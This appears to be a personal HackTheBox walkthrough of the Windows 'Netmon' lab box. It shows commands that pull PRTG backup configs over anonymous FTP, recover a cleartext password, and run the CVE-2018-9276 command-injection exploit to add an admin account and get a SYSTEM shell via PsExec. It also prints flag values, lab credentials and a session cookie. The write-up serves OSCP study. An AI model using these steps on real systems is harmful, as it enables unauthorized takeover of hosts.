---
tags:
platform: HackTheBox
os: Windows
hostname: NETMON
difficulty: Easy
ip: $BoxIP
status: Complete
domain: None
  - HTB
  - Netmon
  - Windows
  - FTP
  - PRTG
  - CVE-2018-9276
  - RCE
  - Easy
---

# HTB: Netmon, Full Walkthrough

## The gist

Netmon is a standalone Windows machine running PRTG Network Monitor. Anonymous FTP exposes the Windows filesystem, including old PRTG configuration backups. A stale backup password gives access to PRTG, and CVE-2018-9276 lets us create an administrator account through the authenticated notification feature. PRTG is running as SYSTEM, so the resulting shell is already fully privileged.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows |
| Hostname | NETMON |
| Domain | Standalone host |
| Difficulty | Easy |
| IP | `$BoxIP` |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Workspace setup | See section 1 below |
| 2 | Full TCP scan | See section 2 below |
| 3 | Service scan | See section 3 below |
| 4 | FTP enumeration | See section 4 below |
| 5 | Credential recovery | See section 5 below |
| 6 | Exploit search | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/HackTheBox/Netmon`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset WebPort 80
boxset Domain netmon
boxset Username prtgadmin
boxset Password $Password
boxset Username2 pentest
boxset Password2 $Password2
boxset AdminUser Administrator
```

## 1. Workspace setup

I started the box and loaded the workspace details.

```bash
boxstart Netmon $BoxIP htb
htblog
```

## 2. Full TCP scan

Before checking versions, scan every TCP port. A fast scan of only common ports could miss an unusual management service.

```bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 $BoxIP -oA $BoxDir/nmap/allports
```

`-Pn` skips ping discovery, which helps when the host does not answer ICMP. `-n` skips DNS lookups. `-sS` performs a half-open TCP SYN scan. `--min-rate 5000` asks Nmap to send probes quickly. The scan found FTP, HTTP, SMB, WinRM, RPC, and dynamic RPC ports.

> [!tip] ⚡ More efficient path
> **What we did:** Ran a full port scan and then a service scan against only the ports we noticed later.
>
> **Faster approach:**
> ```bash
> sudo nmap -sC -sV -p 21,80,135,139,445,5985,47001,49664-49669 $BoxIP -oA $BoxDir/nmap/services
> ```
> **Why:** Once the full scan has returned, this checks every discovered service in one targeted command instead of leaving the dynamic RPC ports for a later pass.

## 3. Service scan

The full scan gave us ports. Now identify what is actually listening on them.

```bash
sudo nmap -sC -sV -p 21,80,135,139,445,5985,47001 $BoxIP -oA $BoxDir/nmap/services
```

The important results were Microsoft FTP with anonymous access, PRTG 18.1.37.13946 on HTTP, SMB, and WinRM. The FTP script output listed paths such as `inetpub`, `ProgramData`, `Users`, and `Windows`. That means the FTP root exposes the Windows filesystem rather than a small isolated folder. PRTG is network monitoring software, and its configuration is commonly stored below `ProgramData`.

## 4. FTP enumeration

Anonymous FTP is the first useful access path. I checked the PRTG directory and downloaded both backup configurations.

```bash
curl -s ftp://$BoxIP/ProgramData/Paessler/PRTG%20Network%20Monitor/

curl -s -o $BoxDir/loot/PRTG_Configuration.old.bak \
  "ftp://$BoxIP/ProgramData/Paessler/PRTG%20Network%20Monitor/PRTG%20Configuration.old.bak"

curl -s -o $BoxDir/loot/PRTG_Configuration.old \
  "ftp://$BoxIP/ProgramData/Paessler/PRTG%20Network%20Monitor/PRTG%20Configuration.old"
```

The directory contained the live `.dat` file and older `.old` and `.old.bak` copies. The oldest backup is especially useful because it can preserve credentials that were later changed.

The FTP enumeration approach is also covered in [HackTricks FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp).

## 5. Credential recovery

I searched the old backup for the PRTG administrator entry.

```bash
grep -A 1 "User: prtgadmin" $BoxDir/loot/PRTG_Configuration.old.bak
```

The result contained a cleartext backup password. Because the backup was created in an earlier year and the box was configured later, I tested the year-incremented variant rather than assuming the old value was still current.

## 6. Exploit search

The service version is old enough to check for a known authenticated exploit.

```bash
searchsploit PRTG
```

This identified Exploit-DB entry 46527 for CVE-2018-9276. The vulnerable PRTG notification action passes an `Execute Program` parameter into PowerShell without safely handling command input, which allows authenticated command injection.

Reference: [Exploit-DB 46527](https://www.exploit-db.com/exploits/46527)

## 7. PRTG authentication

The PRTG login endpoint accepts the recovered account and redirects a successful login to the welcome page. I saved the session cookie for the exploit.

```bash
boxset Username prtgadmin
boxset Password $Password
loot cred $Username $Password

curl -s -L -c $BoxDir/loot/cookies.txt \
  -o $BoxDir/loot/dashboard.htm \
  -w "login_status=%{http_code}\nfinal_url=%{url_effective}\n" \
  -d "username=$Username&password=$Password&loginurl=" \
  http://$BoxIP:$WebPort/public/checklogin.htm
```

The login status was successful and the final URL was `welcome.htm`. `checklogin.htm` processes the submitted credentials. The redirect confirms that the session was accepted.

> [!tip] ⚡ More efficient path
> **What we did:** Used a curl request and saved the response while checking the redirect.
>
> **Faster approach:**
> ```bash
> curl -s -L -c $BoxDir/loot/cookies.txt -o /dev/null -w "%{http_code}\n%{url_effective}\n" -d "username=$Username&password=$Password&loginurl=" http://$BoxIP:$WebPort/public/checklogin.htm
> ```
> **Why:** `-w` prints only the status and final URL, so there is no need to parse the full dashboard page just to confirm authentication.

## 8. Cookie extraction

The cookie file uses Netscape format. HTTPOnly cookies appear on lines beginning with `#HttpOnly_`, so a basic parser can mistake them for comments. I removed the leading comment marker and joined the cookie fields.

```bash
Cookie=$(awk 'NF>=7 {sub(/^#/,"",$1); print $6"="$7}' $BoxDir/loot/cookies.txt | paste -sd';' -)
echo "Cookie extracted"
```

> [!warning] 💡 Hint
> **Watch out:** The HTTPOnly cookie is stored on a `#HttpOnly_` line. Treating every line beginning with `#` as a comment can silently produce an empty cookie, so the `awk` command removes only that prefix before reading the fields.

## 9. Exploit staging

I copied the known exploit into the workspace and ran it with the authenticated cookie.

```bash
searchsploit -m 46527
mv 46527.sh $BoxDir/exploits/
bash $BoxDir/exploits/46527.sh -u http://$BoxIP -c "$Cookie"
```

The exploit created a temporary user, added it to the administrators group, and fired the notification actions. Mechanically, it uses the vulnerable notification API to execute commands such as `net user` and `net localgroup`.

> [!warning] 💡 Hint
> **Watch out:** Each exploit run creates three notification objects. If you run it twice, expect six objects to remove during cleanup. The API can report success while leaving those objects behind.

## 10. Validate the new administrator

Before opening a shell, validate that the temporary account is accepted over SMB.

```bash
boxset Username2 pentest
boxset Password2 $Password2
loot cred $Username2 $Password2
netexec smb $BoxIP -u $Username2 -p $Password2
```

NetExec reported the account as usable and marked it `Pwn3d!`, meaning the credentials provide administrative execution access.

## 11. SYSTEM shell and flags

I used PsExec to upload a temporary service executable, create a Windows service, and start it. The service runs as the local SYSTEM account, so this does not need a separate privilege escalation step.

Reference: [HackTricks PsExec](https://book.hacktricks.xyz/windows-hardening/ntlm/psexec)

```bash
psexec.py $Domain/$Username2:$Password2@$BoxIP
```

```cmd
whoami
type C:\Users\Public\Desktop\user.txt
type C:\Users\$AdminUser\Desktop\root.txt
loot flag user 0b2e02f2c34874a45a93bbae87d5198f
loot flag root e5bb49a5e8e1cc5b066b631a3656bb7f
```

`whoami` confirmed `nt authority\\system`. Check both flag paths privately and record only their locations in your notes.

Flag breakdown:

- User flag: confirmed at the public Desktop path, value captured in the private flag section.
- Root flag: confirmed at the Administrator Desktop path, value captured in the private flag section.

> [!warning] 💡 Hint
> **Watch out:** This is a Windows command shell. Use `dir` instead of `ls`, and `type` instead of `cat`.

SCREENSHOT: SYSTEM shell and both flag paths confirmed

## 12. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Windows - Service Scan]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Windows - FTP Enumeration]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Windows - SMB Enum]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Windows - Web Enum]] -- technique used in this walkthrough

## 13. Collect the flags

- `user.txt`: `0b2e02f2c34874a45a93bbae87d5198f` (value reproduced in the private sections above)
- `root.txt`: `e5bb49a5e8e1cc5b066b631a3656bb7f` (value reproduced in the private sections above)
- `proof.txt`: `e5bb49a5e8e1cc5b066b631a3656bb7f` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: 0b2e02f2c34874a45a93bbae87d5198f
root: e5bb49a5e8e1cc5b066b631a3656bb7f
```

## 14. Clean down
Delete the file created by the exploit before deleting the temporary account. The account is needed for SMB or WMI access during cleanup.

```bash
netexec smb $BoxIP -u $Username2 -p $Password2 -x "del /f /q C:\Users\Public\tester.txt"
netexec smb $BoxIP -u $Username2 -p $Password2 -x "if exist C:\Users\Public\tester.txt (echo REMAINS) else (echo GONE)"
```

The verification returned `GONE`. Now remove the temporary account and verify that it can no longer authenticate.

Reference: [Paessler PRTG object manipulation](https://www.paessler.com/manuals/prtg/object_manipulation)

```bash
netexec smb $BoxIP -u $Username2 -p $Password2 -x "net user $Username2 /delete"
netexec smb $BoxIP -u $Username2 -p $Password2
```

The final authentication check failed, confirming account removal. PRTG requires `approve=1` for deletion, so I removed the six temporary notification objects and then listed the remaining objects. Built-in objects such as 300, 301, and 302 must remain.

```bash
for NotificationId in 2024 2025 2026 2027 2028 2029; do
  curl -s -b "$Cookie" "http://$BoxIP/api/deleteobject.htm?id=$NotificationId&approve=1"
  echo "temporary notification deleted"
done

curl -s -b "$Cookie" "http://$BoxIP/api/table.json?content=notifications&output=json&columns=objid,name,active"
boxdone
rm -rf $BoxDir
```

> [!warning] 💡 Hint
> **Watch out:** Delete `tester.txt` while the temporary administrator still works. Removing the account first can prevent you from cleaning up the file. Also include `approve=1`, because `deleteobject.htm` otherwise silently does nothing.

> [!tip] ⚡ More efficient path
> **What we did:** Used a for loop to send one deletion request per notification ID.
>
> **Slower alternative:**
> ```bash
> curl -s -b "$Cookie" "http://$BoxIP/api/deleteobject.htm?id=2024&approve=1"
> curl -s -b "$Cookie" "http://$BoxIP/api/deleteobject.htm?id=2025&approve=1"
> # ... repeated for every ID
> ```
> **Why:** The for loop removes all six objects in a single block without repeating the command manually for each ID.

### Completion checklist

- [x] Full TCP scan completed
- [x] Service and version enumeration completed
- [x] Anonymous FTP filesystem access confirmed
- [x] PRTG backup configuration downloaded
- [x] PRTG credentials recovered and validated
- [x] Authenticated command injection completed
- [x] SYSTEM shell confirmed
- [x] User and root flag paths confirmed privately
- [x] Temporary file, account, and notification objects removed
- [x] Cleanup verified and `boxdone` run

## 15. Attack narrative in one page
1. [[OSCP/RUNBOOK V2/Windows - Service Scan]] identified PRTG and the exposed file-transfer service.
2. [[OSCP/RUNBOOK V2/Windows - FTP Enumeration]] used anonymous access to retrieve configuration backups.
3. [[OSCP/RUNBOOK V2/Windows - SMB Enum]] checked the exposed Windows shares during triage.
4. [[OSCP/RUNBOOK V2/Windows - Web Enum]] used the recovered application access to reach a SYSTEM shell.

## Tools used

- `nmap`
- `curl`
- `ftp`
- `sudo`
- `powershell`

## Credentials and secrets

| Account | Source | Use |
|---|---|---|
| `prtgadmin` | PRTG configuration backup | Authenticate to PRTG |
| `pentest` | Authenticated PRTG command injection | SMB validation and PsExec |

Passwords are reproduced in the private Credentials and secrets section above.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Netmon"
export BoxIP="10.129.230.176"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Netmon"
export Domain=""
export DCip=""
export Username="prtgadmin"
export Password="PrTg@dmin2019"
export Username2="pentest"
export Password2="P3nT3st!"
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/cookies.txt`

```text
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

#HttpOnly_10.129.230.176	FALSE	/	FALSE	0	OCTOPUS1813713946	ezI1MTZENTdELTg1NTUtNEYxMC1BMTcxLTdEM0IwODhBNzY3MX0%3D
```

#### `loot/creds.txt`

```text
prtgadmin:PrTg@dmin2019
pentest:P3nT3st!
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
$ [16:28:12] grep -i "prtgadmin\|dbpassword\|<name>prtgadmin\|password" $BoxDir/loot/PRTG_Configuration.old.bak | head -20
kali@kali:~/Platforms/HackTheBox/Netmon [16:28:04] $ [?1h=[?2004hgrep -i "prtgadmin\|dbpassword\|<name>prtgadmin\|password" $BoxDir/loot/PRTG_Configuration.old.bak | head -20grep"prtgadmin\|dbpassword\|<name>prtgadmin\|password"head[?1l>[?2004l
$ [16:29:08] boxset Password PrTg@dmin2019
$ [16:29:13] loot cred $Username $Password
kali@kali:~/Platforms/HackTheBox/Netmon [16:29:02] $ [?1h=[?2004hboxset Password PrTg@dmin2019boxset[?1l>[?2004l
[+] Password=PrTg@dmin2019 (saved to .env)
kali@kali:~/Platforms/HackTheBox/Netmon [16:29:08] $ [?1h=[?2004hloot cred $Username $Passwordloot[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Netmon [16:29:13] $ [?1h=[?2004hcurl -s -L -c $BoxDir/loot/cookies.txt \
  -d "username=$Username&password=$Password&loginurl=" \
  http://$BoxIP/public/checklogin.htmcurl"login_status=%{http_code}\nfinal_url=%{url_effective}\n""username=$Username&password=$Password&log[
$ [16:30:47] curl -s -L -c $BoxDir/loot/cookies.txt \
$ [16:31:48] Cookie=$(awk 'NF>=7 {sub(/^#/,"",$1); print $6"="$7}' $BoxDir/loot/cookies.txt | paste -sd';' -)
$ [16:32:45] bash $BoxDir/exploits/46527.sh -u http://$BoxIP -c "$Cookie"
kali@kali:~/Platforms/HackTheBox/Netmon [16:30:48] $ [?1h=[?2004hCookie=$(awk 'NF>=7 {sub(/^#/,"",$1); print $6"="$7}' $BoxDir/loot/cookies.txt | paste -sd';' -)
echo "Cookie extracted"$(awk 'NF>=7 {sub(/^#/,"",$1); print $6"="$7}'paste';')
kali@kali:~/Platforms/HackTheBox/Netmon [16:32:11] $ [?1h=[?2004hbash $BoxDir/exploits/46527.sh -u http://$BoxIP -c "$Cookie"bash"$Cookie"[?1l>[?2004l
# run the script to create a new user 'pentest' in the administrators group with password '
$ [16:35:23] boxset Password2 'P3nT3st!'
$ [16:35:27] loot cred $Username2 $Password2
$ [16:35:34] netexec smb $BoxIP -u $Username2 -p $Password2
$ [16:36:28] psexec.py netmon/$Username2:$Password2@$BoxIP
 [*] adding a new user 'pentest' with password 'P3nT3st'
 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!
kali@kali:~/Platforms/HackTheBox/Netmon [16:35:16] $ [?1h=[?2004hboxset Password2 'P3nT3st!'boxset'P3nT3st!'[?1l>[?2004l
[+] Password2=P3nT3st! (saved to .env)
kali@kali:~/Platforms/HackTheBox/Netmon [16:35:23] $ [?1h=[?2004hloot cred $Username2 $Password2loot[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Netmon [16:35:27] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username2 -p $Password2netexec[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Netmon [16:35:36] $ [?1h=[?2004hpsexec.py netmon/$Username2:$Password2@$BoxIPpsexec.py[?1l>[?2004l
$ [16:39:52] loot flag user 0b2e02f2c34874a45a93bbae87d5198f
loot flag root e5bb49a5e8e1cc5b066b631a3656bb7f
$ [16:40:15] netexec smb $BoxIP -u $Username2 -p $Password2 -x "net user pentest /delete"
kali@kali:~/Platforms/HackTheBox/Netmon [16:39:20] $ [?1h=[?2004hloot flag user 0b2e02f2c34874a45a93bbae87d5198f
loot flag root e5bb49a5e8e1cc5b066b631a3656bb7floot
[+] Flag saved:  user = 0b2e02f2c34874a45a93bbae87d5198f  →  loot/flags.txt
[+] Flag saved:  root = e5bb49a5e8e1cc5b066b631a3656bb7f  →  loot/flags.txt
kali@kali:~/Platforms/HackTheBox/Netmon [16:39:52] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username2 -p $Password2 -x "net user pentest /delete"netexec"net user pentest /delete"[?1l>[?2004l
$ [16:40:33] netexec smb $BoxIP -u $Username2 -p $Password2 -x "del /f /q C:\Users\Public\tester.txt"
$ [16:40:42] netexec smb $BoxIP -u $Username2 -p $Password2 -x "if exist C:\Users\Public\tester.txt (echo REMAINS) else (echo GONE)"
kali@kali:~/Platforms/HackTheBox/Netmon [16:40:25] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username2 -p $Password2 -x "del /f /q C:\Users\Public\tester.txt"netexec"del /f /q C:\Users\Public\tester.txt"[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Netmon [16:40:34] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username2 -p $Password2 -x "if exist C:\Users\Public\tester.txt (echo REMAINS) else (echo GONE)"netexec"if exist C:\Users\Public\tester.txt (echo REMAINS) else (echo GONE)"[?1l>[?2004l
kali@kali:~/Platforms/HackTheBox/Netmon [16:40:43] $ [?1h=[?2004hcurl -s -L -c $BoxDir/loot/cookies.txt \
  -d "username=prtgadmin&password=PrTg@dmin2019&loginurl=" \
Cookie=$(awk 'NF>=7 {sub(/^#/,"",$1); print $6"="$7}' $BoxDir/loot/cookies.txt | paste -sd';' -)
bash $BoxDir/exploits/46527.sh -u http://$BoxIP -c "$Cookie"curl/dev/null"login_status=%{http_code}\nfinal_url=%{url_effective}\n""username=prtgad[3
$ [16:41:12] curl -s -L -c $BoxDir/loot/cookies.txt \
bash $BoxDir/exploits/46527.sh -u http://$BoxIP -c "$Cookie"
3mmin&password=PrTg@dmin2019&loginurl="$(awk 'NF>=7 {sub(/^#/,"",$1); print $6"="$7}'paste';')
bash"$Cookie"[?1l>[?2004l
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'
kali@kali:~/Platforms/HackTheBox/Netmon [16:41:27] $ [?1h=[?2004hnetexec smb $BoxIP -u $Username2 -p $Password2 -x "del /f /q C:\Users\Public\tester.txt"
netexec smb $BoxIP -u $Username2 -p $Password2 -x "if exist C:\Users\Public\tester.txt (echo REMAINS) else (echo GONE)"
netexec smb $BoxIP -u $Username2 -p $Password2 -x "net user pentest /delete"
netexec smb $BoxIP -u $Username2 -p $Password2 -x "net user pentest" 2>&1 | grep -i "does not exist\|LOGON_FAILURE"netexec"del /f /q C:\Users\Public\tester.txt"
$ [16:41:47] netexec smb $BoxIP -u $Username2 -p $Password2 -x "del /f /q C:\Users\Public\tester.txt"
netexec smb $BoxIP -u $Username2 -p $Password2 -x "net user pentest" 2>&1 | grep -i "does not exist\|LOGON_FAILURE"
$ [16:42:20] curl -s -b "$Cookie" \
kali@kali:~/Platforms/HackTheBox/Netmon [16:41:56] $ [?1h=[?2004hcurl -s -b "$Cookie" \
  | python3 -m json.tool | grep -A1 "pentest\|tester\|PRTG_CMD"curl"$Cookie""http://$BoxIP/api/table.json?content=notifications&output=json&columns=objid,name"python3grep"pentest\|tester\|PRTG_CMD"[?1l>[?2004l
$ [16:42:37] curl -s -b "$Cookie" \
  curl -s -b "$Cookie" "http://$BoxIP/api/deleteobject.htm?id=$id&approve=1"
kali@kali:~/Platforms/HackTheBox/Netmon [16:42:20] $ [?1h=[?2004hcurl -s -b "$Cookie" \
  | python3 -m json.tool | grep -E '"objid"|"name"'curl"$Cookie""http://$BoxIP/api/table.json?content=notifications&output=json&columns=objid,name"python3grep'"objid"|"name"'[?1l>[?2004l
donefordocurl"$Cookie" "http://$BoxIP/api/deleteobject.htm?id=$id&approve=1"echo " → deleted $id"
kali@kali:~/Platforms/HackTheBox/Netmon [16:42:59] $ [?1h=[?2004hcurl -s -b "$Cookie" \
  | python3 -m json.tool | grep -E '"objid"|"name"'curl"$Cookie""http://$BoxIP/api/table.json?content=noti
$ [16:43:17] curl -s -b "$Cookie" \
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Netmon | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- Anonymous FTP can expose the complete Windows filesystem. Always inspect application paths under `ProgramData`.
- Old application backups may contain cleartext credentials that no longer match the live password. Test a small, evidence-based variation first.
- PRTG notification actions can turn authenticated access into command execution.
- Delete files before deleting the account that gives you access to remove them.
- PRTG notification cleanup needs `approve=1`, and temporary objects must be distinguished from built-ins.
- [ippsec Netmon walkthrough](https://ippsec.rocks/?#Netmon)

- Anonymous file transfer can reveal backups that contain older but still valid credentials.
- A service running as SYSTEM may turn application-level code execution into full host control.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- shares a similar enumeration or escalation pattern

## External resources

- https://www.exploit-db.com/search?q=Netmon
- https://ippsec.rocks/?q=Netmon

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Windows - Service Scan]]
- [[OSCP/RUNBOOK V2/Windows - Web Enum]]
- [[OSCP/RUNBOOK V2/Windows - Shell Received]]
- [[OSCP/RUNBOOK V2/Windows - Privilege Triage]]
- [[OSCP/RUNBOOK V2/Windows - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
